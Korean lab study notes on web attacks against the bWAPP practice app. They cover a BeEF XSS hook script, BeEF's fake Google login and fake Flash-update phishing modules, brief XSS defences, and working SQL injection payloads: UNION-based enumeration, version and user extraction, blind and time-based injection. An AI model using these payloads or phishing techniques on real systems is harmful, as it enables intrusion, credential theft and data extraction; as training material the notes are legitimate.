# XSS - 피싱 사이트 유도

### 실습 환경 구성
* Kali linux
  * 스냅샷 찍기
  * upgrade 하지 않기
    * ruby, python등이 업데이트 되어서 실습환경과 다를 수 있음
    * 새로운 버전은 직접 받아서 하기
* bee-xss 설치

### beef-xss
* hook
  * 낚는다 -> 보안에서는 뭔가를 훔쳐본다는 의미 
* hook script
  *<script src="http://192.168.75.128:3000/hook.js"></script>
* 세션을 가로채는 것이므로 기간이 있음
  * 사용자가 게시물을 나가면 OFFLINE으로 뜸
* hook.js로 GET 요청이 있으면 악성코드 게시물인 것
* beef-xss는 브라우저의 권한 정도만 통제할 수 있음
  * Hooked Domain
    * Create Alert Dialog
      * 피해자 PC의 브라우저에서 alert 띄울 수 있음
    * Create Prompt Dialog
  * Social Engineering
    * google phising
      * 구글 로그인 하면 실제 로그인 실패 페이지로 리다이렉션
        * 아이디, 비번 알 수 있음
    * fake flash update
      * adobe flash 업데이트하라고 나옴
        * install 하면 악성코드가 다운로드 됨

## 보안 가이드
  1. 시큐어 코딩
    * server side code
      * php, jsp, asp
    * 하나의 보안 모듈(파일)을 만들어서 입력시 거쳐가도록 설정
      * functions_external.php의 xss_check_1() 함수
        * <를 &lt로 변환하는 로직이 있음
        * url encoding을 하면 우회할 수 있음
        * 보안가이드 -> htmlspecialchar 함수 사용
  2. 보안 설정
    * index of, 버전 정보 노출
    * apache 보안 설정
  3. 보안 솔루션 도입
    * 사람의 손으로 막을 수 없는 수준일 때

### 에러베이스 SQL Injection
* beebug root mysql password
  * bug
  * use bWAPP;
  * desc movies;
* SQL Injection - GET Search
  * 싱글 쿼터를 입력하면
    * Error 발생
      * 웹서비스 에러가 아닌 DB 에러 메시지가 그대로 노출
    * select * from movies where title=''';
      * 싱글쿼터는 오류
    * select * from movies where title='"';
      * 이거는 오류 안남
  * select * from movies where title='' or 1=1#
    * 1=1이 참이므로 title은 true가 되고 모든 데이터가 나오게 됨
  * beebug에서 search에 대입해보면
      * ' or 1=1#
        * search에 넣으면 다 나옴
      * ' order by 1#
      * ' order by 2#
      * ' order by 3#
      * ' order by 8#
        * 에러발생 -> 실제 컬럼 개수는 7개이다
  * union 사용
    * 기존에 있던 테이블에 더하는 것
    * 'union select 1,2,3,4,5,6,7#
      * 아래쪽에 컬럼의 순서가 나타남
        * 2 3 5 4
    * 'union select 1,2,3,4#
      * 오류발생 컬럼개수가 틀리니
    * 0'union select 1,2,3,4,5,6,7#
        * 이러면 원하는 결과만 나옴
    * 0'union select 1,@@version,3,4,5,6,7#
      * 버전 정보가 나옴
      * 2번에다 넣음
        * 안보이는 1번에 넣으면 표시되지 않음
    * 0'union select 1,@@version,user(),4,database(),6,7#
      * root권한이고 bWAPP 데이터베이스를 사용하는 것을 알 수 있음
    * information schema
      * 본인을 포함한 다른 데이터베이스의 스키마 정보를 담고 있음
      * information schema의 테이블 정보들을 가져오라 할 수 있음

## 쇼핑몰 대상 공격

* 비밀번호 해시값을 얻었음
  * 구글에 검색하면 바로 나온다
    * 보안성이 약한 sha1 라고 함
  * kali에서 hash-identifier 사용

## 블라인드 인젝션 공격
* sql인젝션이 가능한지 아닌지를 판단 가능
* ' or 1=1 and length(database())=1#
  * false
* ' or 1=1 and length(database())=5#
  * true
  * 뒤에가 틀리면 거짓임
* ' or 1=1 and substring(database(), 1, 1)='a'#
* ' or 1=1 and substring(database(), 1, 1)='b'#
  * true
* ' or 1=1 and substring(database(), 2, 1)='w'#
* ' or 1=1 and ascii(substring(database(), 1, 1))=97#
* ' or 1=1 and ascii(substring(database(), 1, 1))>97#

## 타임베이스 블라인드 SQL Injection

* ` or 1=1 and sleep(5)#
* ` or 1=1 length(database())=5 and sleep(1)#